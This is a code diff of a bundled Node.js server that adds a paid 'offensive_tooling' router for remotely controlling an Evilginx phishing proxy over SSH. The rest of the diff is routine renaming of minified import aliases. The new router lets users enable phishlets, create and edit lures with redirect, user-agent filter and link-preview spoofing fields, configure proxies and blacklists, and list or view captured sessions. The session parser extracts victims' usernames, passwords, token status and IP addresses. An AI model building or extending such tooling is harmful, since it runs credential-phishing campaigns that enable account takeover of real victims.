   /** Get Stripe Connect onboarding link (for incomplete onboarding) */
@@ -61388,8 +61388,8 @@ var marketplaceRouter = router({
     const database = await getDb();
     if (!database || !ctx.user?.id) throw new TRPCError28({ code: "INTERNAL_SERVER_ERROR", message: "DB not available" });
     const { sellerPayoutMethods: sellerPayoutMethods3 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, and: and45 } = await import("drizzle-orm");
-    const methods = await database.select().from(sellerPayoutMethods3).where(and45(eq63(sellerPayoutMethods3.id, input.payoutMethodId), eq63(sellerPayoutMethods3.userId, ctx.user.id))).limit(1);
+    const { eq: eq64, and: and46 } = await import("drizzle-orm");
+    const methods = await database.select().from(sellerPayoutMethods3).where(and46(eq64(sellerPayoutMethods3.id, input.payoutMethodId), eq64(sellerPayoutMethods3.userId, ctx.user.id))).limit(1);
     if (methods.length === 0 || !methods[0].stripeConnectAccountId) {
       throw new TRPCError28({ code: "NOT_FOUND", message: "Stripe Connect payout method not found" });
     }
@@ -61413,11 +61413,11 @@ var marketplaceRouter = router({
     const database = await getDb();
     if (!database) return { users: [], files: [] };
     const { marketplaceListings: marketplaceListings2, sellerProfiles: sellerProfiles3, users: users4 } = await Promise.resolve().then(() => (init_schema(), schema_exports));
-    const { eq: eq63, isNotNull: isNotNull4 } = await import("drizzle-orm");
+    const { eq: eq64, isNotNull: isNotNull4 } = await import("drizzle-orm");
     if (input.userId) {
-      const profiles = await database.select().from(sellerProfiles3).where(eq63(sellerProfiles3.userId, input.userId)).limit(1);
+      const profiles = await database.select().from(sellerProfiles3).where(eq64(sellerProfiles3.userId, input.userId)).limit(1);
       if (profiles.length === 0) return { users: [], files: [] };
-      const listings = await database.select().from(marketplaceListings2).where(eq63(marketplaceListings2.sellerId, profiles[0].id));
+      const listings = await database.select().from(marketplaceListings2).where(eq64(marketplaceListings2.sellerId, profiles[0].id));
       return {
         users: [],
         files: listings.filter((l) => l.fileUrl).map((l) => ({
@@ -61437,7 +61437,7 @@ var marketplaceRouter = router({
     const allProfiles = await database.select().from(sellerProfiles3);
     const userFiles = [];
     for (const profile of allProfiles) {
-      const listings = await database.select().from(marketplaceListings2).where(eq63(marketplaceListings2.sellerId, profile.id));
+      const listings = await database.select().from(marketplaceListings2).where(eq64(marketplaceListings2.sellerId, profile.id));
       const filesCount = listings.filter((l) => l.fileUrl).length;
       if (filesCount > 0) {
         userFiles.push({
@@ -62747,14 +62747,521 @@ var securityDashboardRouter = router({
   })
 });
 
+// server/evilginx-router.ts
+init_trpc();
+init_subscription_gate();
+init_db();
+init_schema();
+import { z as z43 } from "zod";
+import { TRPCError as TRPCError30 } from "@trpc/server";
+import { eq as eq58, and as and43 } from "drizzle-orm";
+import { Client as SSHClient } from "ssh2";
+async function execEvilginxCommand(ssh, command, timeoutMs = 1e4) {
+  return new Promise((resolve3, reject) => {
+    const conn = new SSHClient();
+    let output = "";
+    let errorOutput = "";
+    const timer = setTimeout(() => {
+      conn.end();
+      reject(new Error("SSH command timed out"));
+    }, timeoutMs);
+    conn.on("ready", () => {
+      const cmd = `echo '${command.replace(/'/g, "'\\''")}' | sudo evilginx -developer 2>/dev/null || echo '${command.replace(/'/g, "'\\''")}' | evilginx -developer 2>/dev/null`;
+      conn.exec(cmd, (err, stream) => {
+        if (err) {
+          clearTimeout(timer);
+          conn.end();
+          reject(err);
+          return;
+        }
+        stream.on("close", () => {
+          clearTimeout(timer);
+          conn.end();
+          resolve3(output.trim());
+        }).on("data", (data) => {
+          output += data.toString();
+        }).stderr.on("data", (data) => {
+          errorOutput += data.toString();
+        });
+      });
+    }).on("error", (err) => {
+      clearTimeout(timer);
+      reject(err);
+    }).connect({
+      host: ssh.host,
+      port: ssh.port,
+      username: ssh.username,
+      password: ssh.password || void 0,
+      privateKey: ssh.privateKey || void 0,
+      readyTimeout: 5e3
+    });
+  });
+}
+function parsePhishletList(raw) {
+  const lines = raw.split("\n").filter((l) => l.trim());
+  const results = [];
+  for (const line of lines) {
+    if (line.includes("---") || line.includes("phishlet") || line.startsWith(":")) continue;
+    const parts = line.trim().split(/\s{2,}/);
+    if (parts.length >= 2) {
+      const name = parts[0]?.trim();
+      const hostname = parts[1]?.trim() || "";
+      const status = parts[2]?.trim()?.toLowerCase() || "disabled";
+      if (name && !name.includes("\u2500")) {
+        results.push({
+          name,
+          hostname,
+          status,
+          isEnabled: status === "enabled",
+          isHidden: status === "hidden"
+        });
+      }
+    }
+  }
+  return results;
+}
+function parseLureList(raw) {
+  const lines = raw.split("\n").filter((l) => l.trim());
+  const results = [];
+  for (const line of lines) {
+    if (line.includes("---") || line.includes("lure") || line.startsWith(":")) continue;
+    const parts = line.trim().split(/\s{2,}/);
+    if (parts.length >= 2) {
+      const id = parseInt(parts[0]?.trim());
+      if (!isNaN(id)) {
+        results.push({
+          id,
+          phishlet: parts[1]?.trim() || "",
+          hostname: parts[2]?.trim() || "",
+          path: parts[3]?.trim() || "",
+          redirectUrl: parts[4]?.trim() || "",
+          paused: parts[5]?.trim()?.toLowerCase() === "paused"
+        });
+      }
+    }
+  }
+  return results;
+}
+function parseSessionList(raw) {
+  const lines = raw.split("\n").filter((l) => l.trim());
+  const results = [];
+  for (const line of lines) {
+    if (line.includes("---") || line.includes("session") || line.startsWith(":")) continue;
+    const parts = line.trim().split(/\s{2,}/);
+    if (parts.length >= 3) {
+      const id = parseInt(parts[0]?.trim());
+      if (!isNaN(id)) {
+        results.push({
+          id,
+          phishlet: parts[1]?.trim() || "",
+          username: parts[2]?.trim() || "",
+          password: parts[3]?.trim() || "",
+          tokens: parts[4]?.trim()?.toLowerCase() === "captured",
+          remoteAddr: parts[5]?.trim() || "",
+          createTime: parts[6]?.trim() || ""
+        });
+      }
+    }
+  }
+  return results;
+}
+var evilginxRouter = router({
+  /**
+   * Test SSH connection to the Evilginx server
+   */
+  testConnection: protectedProcedure.input(
+    z43.object({
+      host: z43.string().min(1),
+      port: z43.number().default(22),
+      username: z43.string().min(1),
+      password: z43.string().optional(),
+      privateKey: z43.string().optional()
+    })
+  ).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    try {
+      const result = await execEvilginxCommand(input, "config", 8e3);
+      return { success: true, message: "Connected successfully", raw: result };
+    } catch (err) {
+      return { success: false, message: err.message || "Connection failed" };
+    }
+  }),
+  /**
+   * Save SSH connection details for the user's Evilginx server
+   */
+  saveConnection: protectedProcedure.input(
+    z43.object({
+      host: z43.string().min(1),
+      port: z43.number().default(22),
+      username: z43.string().min(1),
+      password: z43.string().optional(),
+      privateKey: z43.string().optional()
+    })
+  ).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });
+    const configJson = JSON.stringify(input);
+    const existing = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (existing.length > 0) {
+      await db.update(userSecrets).set({ encryptedValue: configJson, updatedAt: /* @__PURE__ */ new Date() }).where(eq58(userSecrets.id, existing[0].id));
+    } else {
+      await db.insert(userSecrets).values({
+        userId: ctx.user.id,
+        name: "__evilginx_ssh",
+        encryptedValue: configJson
+      });
+    }
+    return { success: true };
+  }),
+  /**
+   * Get saved SSH connection (masked)
+   */
+  getConnection: protectedProcedure.query(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) return null;
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) return null;
+    try {
+      const config = JSON.parse(result[0].encryptedValue);
+      return {
+        host: config.host,
+        port: config.port,
+        username: config.username,
+        hasPassword: !!config.password,
+        hasPrivateKey: !!config.privateKey
+      };
+    } catch {
+      return null;
+    }
+  }),
+  /**
+   * Execute any Evilginx command via SSH
+   */
+  exec: protectedProcedure.input(z43.object({ command: z43.string().min(1) })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) {
+      throw new TRPCError30({ code: "BAD_REQUEST", message: "No Evilginx server configured. Please set up your SSH connection first." });
+    }
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, input.command);
+    return { output };
+  }),
+  // ─── Config ─────────────────────────────────────────────────────
+  getConfig: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, "config");
+    return { output };
+  }),
+  setConfig: protectedProcedure.input(
+    z43.object({
+      domain: z43.string().optional(),
+      ipv4: z43.string().optional(),
+      ipv4External: z43.string().optional(),
+      ipv4Bind: z43.string().optional(),
+      unauthUrl: z43.string().optional()
+    })
+  ).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const commands = [];
+    if (input.domain) commands.push(`config domain ${input.domain}`);
+    if (input.ipv4) commands.push(`config ipv4 ${input.ipv4}`);
+    if (input.ipv4External) commands.push(`config ipv4 external ${input.ipv4External}`);
+    if (input.ipv4Bind) commands.push(`config ipv4 bind ${input.ipv4Bind}`);
+    if (input.unauthUrl) commands.push(`config unauth_url ${input.unauthUrl}`);
+    const results = [];
+    for (const cmd of commands) {
+      const out = await execEvilginxCommand(sshConfig, cmd);
+      results.push(out);
+    }
+    return { output: results.join("\n") };
+  }),
+  // ─── Phishlets ──────────────────────────────────────────────────
+  listPhishlets: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, "phishlets");
+    return { raw: output, phishlets: parsePhishletList(output) };
+  }),
+  enablePhishlet: protectedProcedure.input(z43.object({ name: z43.string(), hostname: z43.string().optional() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const commands = [];
+    if (input.hostname) commands.push(`phishlets hostname ${input.name} ${input.hostname}`);
+    commands.push(`phishlets enable ${input.name}`);
+    const results = [];
+    for (const cmd of commands) {
+      results.push(await execEvilginxCommand(sshConfig, cmd));
+    }
+    return { output: results.join("\n") };
+  }),
+  disablePhishlet: protectedProcedure.input(z43.object({ name: z43.string() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `phishlets disable ${input.name}`);
+    return { output };
+  }),
+  hidePhishlet: protectedProcedure.input(z43.object({ name: z43.string() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `phishlets hide ${input.name}`);
+    return { output };
+  }),
+  setPhishletHostname: protectedProcedure.input(z43.object({ name: z43.string(), hostname: z43.string() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `phishlets hostname ${input.name} ${input.hostname}`);
+    return { output };
+  }),
+  getPhishletHosts: protectedProcedure.input(z43.object({ name: z43.string() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `phishlets get-hosts ${input.name}`);
+    return { output };
+  }),
+  // ─── Lures ──────────────────────────────────────────────────────
+  listLures: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, "lures");
+    return { raw: output, lures: parseLureList(output) };
+  }),
+  createLure: protectedProcedure.input(z43.object({ phishlet: z43.string() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `lures create ${input.phishlet}`);
+    return { output };
+  }),
+  editLure: protectedProcedure.input(
+    z43.object({
+      id: z43.number(),
+      field: z43.enum(["hostname", "path", "redirect_url", "redirector", "ua_filter", "og_title", "og_desc", "og_image", "og_url", "info"]),
+      value: z43.string()
+    })
+  ).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `lures edit ${input.id} ${input.field} ${input.value}`);
+    return { output };
+  }),
+  deleteLure: protectedProcedure.input(z43.object({ id: z43.number() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `lures delete ${input.id}`);
+    return { output };
+  }),
+  pauseLure: protectedProcedure.input(z43.object({ id: z43.number(), duration: z43.string() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `lures pause ${input.id} ${input.duration}`);
+    return { output };
+  }),
+  unpauseLure: protectedProcedure.input(z43.object({ id: z43.number() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `lures unpause ${input.id}`);
+    return { output };
+  }),
+  getLureUrl: protectedProcedure.input(z43.object({ id: z43.number() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `lures get-url ${input.id}`);
+    return { output };
+  }),
+  // ─── Sessions ───────────────────────────────────────────────────
+  listSessions: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, "sessions");
+    return { raw: output, sessions: parseSessionList(output) };
+  }),
+  getSession: protectedProcedure.input(z43.object({ id: z43.number() })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `sessions ${input.id}`);
+    return { output };
+  }),
+  deleteSession: protectedProcedure.input(z43.object({ id: z43.union([z43.number(), z43.literal("all")]) })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `sessions delete ${input.id}`);
+    return { output };
+  }),
+  // ─── Proxy ──────────────────────────────────────────────────────
+  getProxy: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, "proxy");
+    return { output };
+  }),
+  setProxy: protectedProcedure.input(
+    z43.object({
+      type: z43.enum(["http", "socks5"]).optional(),
+      address: z43.string().optional(),
+      port: z43.number().optional(),
+      username: z43.string().optional(),
+      password: z43.string().optional(),
+      enabled: z43.boolean().optional()
+    })
+  ).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const commands = [];
+    if (input.type) commands.push(`proxy type ${input.type}`);
+    if (input.address) commands.push(`proxy address ${input.address}`);
+    if (input.port) commands.push(`proxy port ${input.port}`);
+    if (input.username) commands.push(`proxy username ${input.username}`);
+    if (input.password) commands.push(`proxy password ${input.password}`);
+    if (input.enabled !== void 0) commands.push(`proxy enabled ${input.enabled}`);
+    const results = [];
+    for (const cmd of commands) {
+      results.push(await execEvilginxCommand(sshConfig, cmd));
+    }
+    return { output: results.join("\n") };
+  }),
+  // ─── Blacklist ──────────────────────────────────────────────────
+  getBlacklist: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, "blacklist");
+    return { output };
+  }),
+  setBlacklist: protectedProcedure.input(z43.object({ mode: z43.enum(["off", "unauth", "all"]) })).mutation(async ({ ctx, input }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "Evilginx Management");
+    const db = await getDb();
+    if (!db) throw new TRPCError30({ code: "INTERNAL_SERVER_ERROR" });
+    const result = await db.select().from(userSecrets).where(and43(eq58(userSecrets.userId, ctx.user.id), eq58(userSecrets.name, "__evilginx_ssh"))).limit(1);
+    if (result.length === 0) throw new TRPCError30({ code: "BAD_REQUEST", message: "No server configured" });
+    const sshConfig = JSON.parse(result[0].encryptedValue);
+    const output = await execEvilginxCommand(sshConfig, `blacklist ${input.mode}`);
+    return { output };
+  })
+});
+
 // server/api/files.ts
 init_trpc();
-import { z as z43 } from "zod";
+import { z as z44 } from "zod";
 import fs5 from "fs/promises";
 import path5 from "path";
 var BASE_DIR = path5.resolve(process.cwd(), "my_projects");
 var filesRouter = router({
-  list: publicProcedure.input(z43.object({ path: z43.string().optional() })).query(async ({ input }) => {
+  list: publicProcedure.input(z44.object({ path: z44.string().optional() })).query(async ({ input }) => {
     const requestedPath = input.path ? path5.normalize(input.path) : "";
     const fullPath = path5.join(BASE_DIR, requestedPath);
     if (!fullPath.startsWith(BASE_DIR)) {
@@ -62836,7 +63343,8 @@ var appRouter = router({
   marketplace: marketplaceRouter,
   siteMonitor: siteMonitorRouter,
   securityDashboard: securityDashboardRouter,
-  customInstructions: customInstructionsRouter
+  customInstructions: customInstructionsRouter,
+  evilginx: evilginxRouter
 });
 
 // server/_core/serve-static.ts
@@ -62884,7 +63392,7 @@ init_db();
 init_schema();
 import bcrypt3 from "bcryptjs";
 import crypto18 from "crypto";
-import { eq as eq58, and as and43, isNotNull as isNotNull3 } from "drizzle-orm";
+import { eq as eq59, and as and44, isNotNull as isNotNull3 } from "drizzle-orm";
 init_const();
 init_env();
 init_notification();
@@ -63124,7 +63632,7 @@ function registerEmailAuthRoutes(app) {
         return res.status(500).json({ error: "Database not available" });
       }
       const normalizedEmail = email.trim().toLowerCase();
-      const existing = await db.select({ id: users.id }).from(users).where(eq58(users.email, normalizedEmail)).limit(1);
+      const existing = await db.select({ id: users.id }).from(users).where(eq59(users.email, normalizedEmail)).limit(1);
       if (existing.length > 0) {
         return res.status(409).json({ error: "An account with this email already exists. Please sign in instead." });
       }
@@ -63164,7 +63672,7 @@ function registerEmailAuthRoutes(app) {
       });
       const cookieOptions = getSessionCookieOptions(req);
       res.cookie(COOKIE_NAME, sessionToken, { ...cookieOptions, maxAge: ONE_YEAR_MS });
-      const newUser = await db.select().from(users).where(eq58(users.openId, openId)).limit(1);
+      const newUser = await db.select().from(users).where(eq59(users.openId, openId)).limit(1);
       if (newUser[0]) {
         await db.insert(identityProviders).values({
           userId: newUser[0].id,
@@ -63215,8 +63723,8 @@ function registerEmailAuthRoutes(app) {
       }
       const normalizedEmail = email.trim().toLowerCase();
       const result = await db.select({ id: users.id, name: users.name, email: users.email }).from(users).where(
-        and43(
-          eq58(users.email, normalizedEmail),
+        and44(
+          eq59(users.email, normalizedEmail),
           isNotNull3(users.passwordHash)
         )
       ).limit(1);
@@ -63268,7 +63776,7 @@ function registerEmailAuthRoutes(app) {
         userId: passwordResetTokens.userId,
         expiresAt: passwordResetTokens.expiresAt,
         usedAt: passwordResetTokens.usedAt
-      }).from(passwordResetTokens).where(eq58(passwordResetTokens.token, token)).limit(1);
+      }).from(passwordResetTokens).where(eq59(passwordResetTokens.token, token)).limit(1);
       if (result.length === 0) {
         return res.status(400).json({ error: "Invalid or expired reset link", valid: false });
       }
@@ -63279,7 +63787,7 @@ function registerEmailAuthRoutes(app) {
       if (/* @__PURE__ */ new Date() > resetToken.expiresAt) {
         return res.status(400).json({ error: "This reset link has expired. Please request a new one.", valid: false });
       }
-      const userResult = await db.select({ email: users.email }).from(users).where(eq58(users.id, resetToken.userId)).limit(1);
+      const userResult = await db.select({ email: users.email }).from(users).where(eq59(users.id, resetToken.userId)).limit(1);
       return res.json({
         valid: true,
         email: userResult[0]?.email || "your account"
